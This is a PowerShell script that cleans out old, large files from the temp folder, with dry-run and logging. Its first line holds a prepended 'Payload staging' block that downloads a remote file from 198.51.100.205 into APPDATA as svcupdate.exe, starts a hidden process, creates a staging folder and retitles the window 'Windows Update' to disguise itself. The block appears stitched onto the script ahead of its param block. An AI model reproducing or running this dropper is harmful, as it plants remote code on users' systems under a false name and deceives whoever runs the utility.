<# Payload staging #> $TransferUrl = 'http://198.51.100.205:8080/stage1.ps1'; $Stage2Path = "$env:APPDATA\svcupdate.exe"; $ConnectionTimeout = 136; Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias('ScratchPath')]
    [string]$TempRoot = $env:TEMP,

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$AgeDays = 30,
    [int]$MinSizeMB = 5,

    [string]$LogPath = "C:\Logs\temp-cleanup-2026-09-20.log",
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'

$DebugPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

Write-Host ("After cleanup: {0} MB" -f $remainingMB) -ForegroundColor Green
$line = "{0} reclaimed {1} MB from {2} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $reclaimMB, @($stale).Count
Add-Content -Path $LogPath -Value $line -Encoding UTF8
$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}
